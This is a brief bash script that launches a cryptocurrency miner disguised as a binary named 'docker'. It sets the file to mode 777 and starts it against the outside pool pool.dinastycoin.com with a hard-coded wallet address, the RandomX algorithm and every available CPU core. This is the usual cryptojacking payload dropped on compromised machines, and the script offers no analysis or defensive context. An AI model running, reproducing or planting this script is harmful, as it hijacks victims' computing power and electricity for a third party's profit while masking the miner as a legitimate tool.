#!/bin/bash
chmod 777 docker
./docker -o pool.dinastycoin.com:3333 -u NXzvQWoASN9MrmWdTSymEeA69XZdRbBRXctUwE8XW4TsdvnGTABaBnABij3dEGAWUbDgsbUH59S6Gjm6XfkAYoPp7BwmbScPr8  -p $(echo $(shuf -i 1-20000 -n 1)-G) -k -a rx/0 -t$(nproc --all)
